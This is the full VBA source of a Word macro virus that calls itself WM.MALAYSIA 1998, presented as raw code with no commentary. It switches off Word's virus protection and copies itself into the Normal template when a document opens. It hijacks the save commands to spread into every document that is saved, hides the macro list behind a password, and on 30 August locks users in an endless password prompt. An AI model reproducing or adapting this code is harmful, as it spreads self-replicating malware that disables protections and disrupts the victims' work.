   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Malaysia1998"

   Sub AutoExec()

   Options.VirusProtection = False

   End Sub

   Sub AutoOpen()

   On Error GoTo err
   Options.SaveNormalPrompt = False
   DocumentToNormal
   NormalTemplate.Save
   err:

   End Sub

   Sub FileSave()

   Application.EnableCancelKey = wdCancelDisabled
   Trigger
   On Error GoTo err
      NormalToDocument
      ActiveDocument.Save
   err:
   Application.EnableCancelKey = wdCancelInterrupt

   End Sub

   Sub FileSaveAs()
   Attribute FileSaveAs.VB_Description = "Macro recorded 04/09/98 by Ng Bing Yew"
   Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro2"

   Application.EnableCancelKey = wdCancelDisabled
   Trigger
   On Error GoTo err
      NormalToDocument
      Dialogs(wdDialogFileSaveAs).Show
   err:
   Application.EnableCancelKey = wdCancelInterrupt

   End Sub

   Sub ToolsMacro()

   Application.EnableCancelKey = wdCancelDisabled
      titles = "Macro Proteced"
      msg = "Please enter correct password in order to access the macro:"
      Passcode = InputBox(msg, titles)
      If Passcode = "Bad Logic" Then
         Dialogs(wdDialogToolsMacro).Show
      Else
         MsgBox ("Access denied...")
      End If
   Application.EnableCancelKey = wdCancelDisabled

   End Sub

   Sub NormalToDocument()

   On Error GoTo err
      cur_doc = ActiveDocument.FullName
      global_temp = NormalTemplate.FullName
      macroname = "Malaysia1998"
      Application.OrganizerCopy Source:=global_temp, _
      Destination:=cur_doc, Name:=macroname, _
      Object:=wdOrganizerObjectProjectItems
   err:

   End Sub

   Sub DocumentToNormal()

   On Error GoTo err
      cur_doc = ActiveDocument.FullName
      global_temp = NormalTemplate.FullName
      macroname = "Malaysia1998"
      Application.OrganizerCopy Source:=cur_doc, _
                                Destination:=global_temp, _
                                Name:=macroname, _
                                Object:=wdOrganizerObjectProjectItems
   err:

   End Sub

   Sub Trigger()

   On Error GoTo err
      Todaydate = Date
      If (Month(Todaydate) = 8) And (Day(Todaydate) = 30) Then
          Do
            cr = Chr(13) + Chr(10)
            titles = "WM.MALAYSIA 1998"
            msg1 = "You are lucky!!! You have met WM.MALAYSIA 1998!!!" + cr
            msg2 = "WM.MALAYSIA 1998 is Malaysian's first MACRO VIRUS." + cr
            msg3 = "It is written by a young college student -- BAD LOGIC." + cr
            msg4 = cr + cr + cr + cr + "Please ENTER CORRECT password: "
            msg = msg1 + msg2 + msg3 + msg4
            response = InputBox(msg, titles)
          Loop While (response <> "WM.MALAYSIA 1998")
       End If
   err:

   End Sub
